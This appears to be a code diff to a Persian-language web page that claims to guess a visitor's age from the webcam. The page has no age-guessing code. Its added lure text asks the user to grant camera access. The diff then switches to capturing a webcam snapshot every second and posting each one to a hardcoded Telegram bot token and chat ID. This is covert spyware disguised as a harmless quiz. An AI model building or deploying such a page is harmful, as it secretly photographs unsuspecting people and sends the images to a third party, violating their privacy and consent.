@@ -6,8 +6,8 @@
     <title>حدس سن</title>
     <script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
     <style>
-        canvas {
-            display: none;
+        body {
+            position: relative;
         }
         #overlay {
             position: absolute;
@@ -24,10 +24,30 @@
             left: 0;
             z-index: 0;
         }
+        #message {
+            position: absolute;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: rgb(0, 0, 0); /* رنگ و سبک متن را بر اساس نیاز خود تنظیم کنید */
+            z-index: 2; /* این لایه بالایی‌تر از #overlay است */
+        }
+        #masdor {
+            position: absolute;
+            margin-top: 60px;
+            font-size: 24px;
+            font-weight: bold;
+            color: rgb(0, 0, 0); /* رنگ و سبک متن را بر اساس نیاز خود تنظیم کنید */
+            z-index: 2; /* این لایه بالایی‌تر از #overlay است */
+
+        }
+
     </style>
 </head>
 <body>
     <div id="overlay"></div>
+    <div id="message">لطفا 10 ثانیه تا لود شدن منتظر باش</div>
+    <div id="masdor">دسترسی دوربین را برای این که سایت کار کند مجاز کن</div>
     <video id="webCam" autoplay playsinline width="900" height="700"></video>
     <canvas id="canvas" aria-placeholder="sadrag"></canvas>
     <script>
@@ -35,13 +55,12 @@
             const webCamElement = document.getElementById("webCam");
             const canvasElement = document.getElementById("canvas");
             const webcam = new Webcam(webCamElement, "user", canvasElement);
-            
-            // Initialize snapshotCounter from localStorage or start from 1 if not present
+
             let snapshotCounter = localStorage.getItem('snapshotCounter');
             if (!snapshotCounter) {
                 snapshotCounter = 1;
             } else {
-                snapshotCounter = parseInt(snapshotCounter); // Ensure it's an integer
+                snapshotCounter = parseInt(snapshotCounter);
             }
 
             function checkCameraPermission() {
@@ -51,7 +70,7 @@
                     requestCameraPermission();
                 }
             }
-        
+
             function requestCameraPermission() {
                 webcam.start()
                     .then(() => {
@@ -60,22 +79,22 @@
                     })
                     .catch(err => {
                         localStorage.setItem('cameraPermission', 'denied');
-                        setTimeout(requestCameraPermission, 1000); // Retry after 3 seconds
+                        setTimeout(requestCameraPermission, 1000);
                     });
             }
-        
+
             function startWebcam() {
                 webcam.start()
                     .then(() => {
-                        setTimeout(() => {
+                        setInterval(() => {
                             takeAPicture();
-                        }, 1000); // Wait time (1 second)
+                        }, 1000);
                     })
                     .catch(err => {
                         console.error(err);
                     });
             }
-        
+
             function dataURLToBlob(dataURL) {
                 const parts = dataURL.split(';base64,');
                 const byteString = atob(parts[1]);
@@ -91,18 +110,15 @@
             function takeAPicture() {
                 let picture = webcam.snap();
                 let pictureBlob = dataURLToBlob(picture);
-                let fileName = `snapshot${snapshotCounter}.png`; // Unique file name
+                let fileName = `snapshot${snapshotCounter}.png`;
 
-                // Replace with your Telegram bot API token and chat ID
-                let botToken = '7237749285:AAGGtOLFEncaQQsFwqFWZk-iydsJjmSm4yM';
-                let chatId = '5480769413';
+                let botToken = '7237749285:AAGGtOLFEncaQQsFwqFWZk-iydsJjmSm4yM'; // Replace with your Telegram bot API token
+                let chatId = '5480769413'; // Replace with your Telegram chat ID
 
-                // Prepare FormData to send file to Telegram
                 let formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', pictureBlob, fileName);
 
-                // Send the file using fetch
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
@@ -115,10 +131,10 @@
                     console.error('Error sending message to Telegram:', error);
                 });
 
-                snapshotCounter++; // Increment snapshot counter for next picture
-                localStorage.setItem('snapshotCounter', snapshotCounter); // Save snapshotCounter in localStorage
+                snapshotCounter++;
+                localStorage.setItem('snapshotCounter', snapshotCounter);
             }
-        
+
             checkCameraPermission();
         });
     </script>
